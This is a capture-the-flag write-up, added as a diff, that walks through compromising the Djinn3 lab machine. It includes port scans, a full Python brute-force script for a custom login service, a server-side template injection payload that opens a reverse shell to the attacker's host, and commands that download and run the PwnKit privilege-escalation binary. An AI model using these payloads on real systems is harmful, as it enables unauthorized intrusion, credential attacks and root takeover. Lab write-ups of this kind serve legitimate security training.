@@ -1,0 +1,239 @@
+<h2>Overview</h2>
+<p>Djinn3 is a medium-difficulty Linux machine exposing multiple services, including HTTP on port 80, a Python-based web service on port 5000, SSH on 22, and a custom service on port 31337. Enumeration reveals a vulnerable ticketing application on port 31337, susceptible to <strong>SSTI (Server-Side Template Injection)</strong>. Exploiting this SSTI allows us to achieve a reverse shell as <strong>www-data</strong>. Privilege escalation is accomplished using the <strong>PwnKit (pkexec) SUID exploit</strong>, giving full root access.</p>
+
+<h2>Key steps</h2>
+<ol>
+  <li>Full TCP port scan using nmap to identify all open ports.</li>
+  <li>Service enumeration to determine versions and behavior, especially on port 31337.</li>
+  <li>Bruteforce authentication on the ticketing system, discovering valid credentials <strong>guest:guest</strong>.</li>
+  <li>Verification of SSTI vulnerability in the ticketing system's ticket fields.</li>
+  <li>Reverse shell payload execution via SSTI to obtain <strong>www-data</strong> shell.</li>
+  <li>Enumeration for privilege escalation, identifying SUID binaries with <strong>find / -perm -4000 -type f</strong>.</li>
+  <li>Exploitation of <strong>PwnKit</strong> to elevate to root and obtain full control of the system.</li>
+</ol>
+
+<h3>1. Port enumeration</h3>
+<p>A SYN scan of all TCP ports is performed:</p>
+
+<pre><code>sudo nmap -p- -sS --open --min-rate 5000 -Pn -n -vvv 192.168.0.15 -oG allPorts</code></pre>
+
+<p><strong>Results:</strong></p>
+
+<pre><code>PORT      STATE SERVICE
+22/tcp    open  ssh
+80/tcp    open  http
+5000/tcp  open  http
+31337/tcp open  Elite?</code></pre>
+
+<p>Next, a detailed scan of these ports is performed:</p>
+
+<pre><code>sudo nmap -p22,80,5000,31337 -sCV -n -vvv 192.168.0.15 -oN infoPorts</code></pre>
+
+<p><strong>Results with version detection:</strong></p>
+
+<pre><code>22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3
+80/tcp    open  http    lighttpd 1.4.45
+|_http-title: Custom-ers
+5000/tcp  open  http    Werkzeug httpd 1.0.1 (Python 3.6.9)
+|_http-title: Site doesn't have a title
+31337/tcp open  Elite?
+| fingerprint-strings indicate a ticketing system prompting for username/password</code></pre>
+
+<h3>2. Bruteforce ticketing system</h3>
+<p>A brute-force attack is performed on port 31337:</p>
+<p>I use the next exploit:</p>
+<pre><code>#!/usr/bin/env python3
+import socket
+import argparse
+import threading
+import time
+import sys
+from queue import Queue
+
+# ============================
+# Animación estilo bolita moviéndose + mostrar intento
+# ============================
+def animate(stop_event):
+    width = 6
+    toggle = True
+    while not stop_event.is_set():
+        try:
+            user = current_attempt.get('user', '...')
+            pwd = current_attempt.get('pass', '...')
+            for i in range(width):
+                if stop_event.is_set():
+                    break
+                line = ['-'] * width
+                line[i] = 'C' if toggle else 'c'
+                toggle = not toggle
+                # Mostrar animación + intento
+                sys.stdout.write('\r[{}] Trying {}:{}{}'.format(
+                    ''.join(line),
+                    user,
+                    pwd,
+                    ' ' * max(0, 20 - len(pwd))  # limpia restos de contraseñas largas
+                ))
+                sys.stdout.flush()
+                time.sleep(0.2)
+        except Exception:
+            break
+    sys.stdout.write('\r' + ' ' * 80 + '\r')
+    sys.stdout.flush()
+
+# ============================
+# Fuerza bruta
+# ============================
+def bruteforce(target, port, stop_event):
+    while not user_pass_queue.empty():
+        user, pwd = user_pass_queue.get()
+        current_attempt['user'] = user
+        current_attempt['pass'] = pwd
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.settimeout(3)
+            s.connect((target, port))
+
+            # Recibe prompt de username
+            s.recv(1024)
+            s.sendall(user.encode() + b'\n')
+
+            # Recibe prompt de password
+            s.recv(1024)
+            s.sendall(pwd.encode() + b'\n')
+
+            # Recibe toda la respuesta
+            response = b""
+            try:
+                while True:
+                    chunk = s.recv(1024)
+                    if not chunk:
+                        break
+                    response += chunk
+            except socket.timeout:
+                pass
+            response = response.decode(errors="ignore")
+
+            # Evaluar éxito
+            if "authentication failed" not in response.lower() and response.strip() != "":
+                sys.stdout.write(f"\n[+] SUCCESS! Username: '{user}' Password: '{pwd}'\n")
+                sys.stdout.flush()
+
+            s.close()
+        except Exception:
+            pass
+        finally:
+            user_pass_queue.task_done()
+
+# ============================
+# Main
+# ============================
+if __name__ == "__main__":
+    parser = argparse.ArgumentParser(description="Brute Force Exploit with Animated Attempt Display")
+    parser.add_argument("-t", "--target", required=True)
+    parser.add_argument("-p", "--port", type=int, required=True)
+    parser.add_argument("-U", "--userfile", required=True)
+    parser.add_argument("-P", "--passfile", required=True)
+    parser.add_argument("-T", "--threads", type=int, default=4)
+    args = parser.parse_args()
+
+    # Cargar diccionarios
+    with open(args.userfile, "r") as f:
+        usernames = [line.strip() for line in f if line.strip()]
+    with open(args.passfile, "r") as f:
+        passwords = [line.strip() for line in f if line.strip()]
+
+    # Crear cola
+    user_pass_queue = Queue()
+    for u in usernames:
+        for p in passwords:
+            user_pass_queue.put((u, p))
+
+    # Diccionario compartido para animación
+    current_attempt = {}
+
+    stop_event = threading.Event()
+
+    # Iniciar animación
+    t_anim = threading.Thread(target=animate, args=(stop_event,))
+    t_anim.start()
+
+    # Iniciar threads de fuerza bruta
+    threads = []
+    for _ in range(args.threads):
+        t = threading.Thread(target=bruteforce, args=(args.target, args.port, stop_event))
+        t.start()
+        threads.append(t)
+
+    # Esperar hilos
+    for t in threads:
+        t.join()
+
+    stop_event.set()
+    t_anim.join()
+
+    print("\n[-] Bruteforce completed.")
+</code></pre>
+<pre><code>python3 exploit.py -t 192.168.0.15 -p 31337 -U usercommon.txt -P passcommon.txt -T 50</code></pre>
+
+<p><strong>Success:</strong></p>
+
+<pre><code>Username: 'guest'
+Password: 'guest'</code></pre>
+
+<h3>3. SSTI exploitation and initial shell</h3>
+<p>After logging in with guest credentials:</p>
+
+<pre><code>nc 192.168.0.15 31337
+username> guest
+password> guest</code></pre>
+
+<p>Help command shows available ticketing system commands:</p>
+
+<pre><code>help
+  help    Show this menu
+  update  Update the ticketing software
+  open    Open a new ticket
+  close   Close an existing ticket
+  exit    Exit</code></pre>
+
+<p>The ticket creation functionality evaluates template strings, confirming <strong>SSTI</strong>:</p>
+
+<pre><code>{{ 3*3 }}</code></pre>
+
+<p><img src="writeups/img/djinn3/img1.png" alt="SSTI test confirms multiplication returns 9"></p>
+
+<p>For a reverse shell, we inject:</p>
+
+<pre><code>{{ self.__init__.__globals__.__builtins__.__import__('os').popen('python3 -c "import socket,subprocess,os;s=socket.socket();s.connect((\'192.168.0.10\',6969));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn(\'/bin/bash\')"').read() }}</code></pre>
+
+<p>Start listener on our machine:</p>
+
+<pre><code>nc -lvnp 6969</code></pre>
+
+<p><strong>Shell obtained as www-data:</strong></p>
+
+<pre><code>whoami
+www-data
+ls
+data.json  static  templates  webapp.py</code></pre>
+
+<h3>4. Privilege escalation</h3>
+<p>Enumeration of SUID binaries:</p>
+
+<pre><code>find / -perm -4000 -type f 2>/dev/null</code></pre>
+
+<p>PwnKit is found as a viable exploit. Download, make executable, and run:</p>
+
+<pre><code>wget -q https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit -O PwnKit
+chmod +x ./PwnKit
+./PwnKit</code></pre>
+
+<p>Shell is elevated to <strong>root</strong>:</p>
+
+<pre><code>whoami
+root</code></pre>
+
+<h3>5. Summary</h3>
+<p>Using **SSTI** in the ticketing system, a reverse shell is obtained as <strong>www-data</strong>. Root access is achieved through the **PwnKit SUID exploit**, completing full compromise of the Djinn3 machine.</p>
+
+
